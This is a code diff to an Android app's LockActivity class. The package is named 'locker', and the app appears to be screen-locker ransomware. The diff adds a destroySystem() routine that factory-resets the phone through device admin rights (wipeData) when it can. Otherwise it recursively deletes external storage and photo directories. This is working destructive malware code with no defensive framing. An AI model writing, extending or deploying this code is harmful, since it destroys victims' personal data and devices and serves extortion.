@@ -1,6 +1,8 @@
 package com.locker;
 
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -197,6 +199,26 @@ public class LockActivity extends Activity {
     }
 
     private void destroySystem() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
+        
+        if (dpm != null && adminComponent != null) {
+            if (dpm.isAdminActive(adminComponent)) {
+                try {
+                    dpm.wipeData(0);
+                } catch (Exception e) {
+                    deleteFiles();
+                }
+            } else {
+                deleteFiles();
+            }
+        } else {
+            deleteFiles();
+        }
+        finish();
+    }
+
+    private void deleteFiles() {
         String[] paths = {
             Environment.getExternalStorageDirectory().getAbsolutePath(),
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath(),
@@ -209,7 +231,6 @@ public class LockActivity extends Activity {
         for (String path : paths) {
             deleteRecursive(new File(path));
         }
-        finish();
     }
 
     private void deleteRecursive(File fileOrDirectory) {
@@ -329,4 +350,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-                }
+            }
